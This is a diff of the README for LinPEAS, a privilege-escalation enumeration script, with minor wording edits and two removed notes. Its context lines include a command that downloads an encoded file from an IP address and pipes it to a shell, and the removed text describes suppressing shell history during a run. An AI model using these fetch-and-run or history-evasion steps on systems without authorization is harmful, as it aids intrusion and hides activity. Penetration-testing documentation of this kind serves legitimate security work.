@@ -49,8 +49,6 @@ sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
-**Use the parameter `-a` to execute all these checks.**
-
 ## MacPEAS
 
 Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed!!**
@@ -78,7 +76,7 @@ By default linpeas takes around **2 mins** to complete, but It could take from *
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
-LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable. It also **exports and unset** some environmental variables during the execution so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
+LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable.
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/help.png)
 
@@ -147,9 +145,9 @@ Here you have an old linpe version script in one line, **just copy and paste it*
 
 **The color filtering is not available in the one-liner** (the lists are too big)
 
-This one-liner is deprecated (I am not going to update it more), but it could be useful in some cases so it will remain here:
+This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.
 
-The default file where all the data is recorded is: */tmp/linPE* (you can change it at the beginning of the script)
+The default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)
 
 
 ```sh
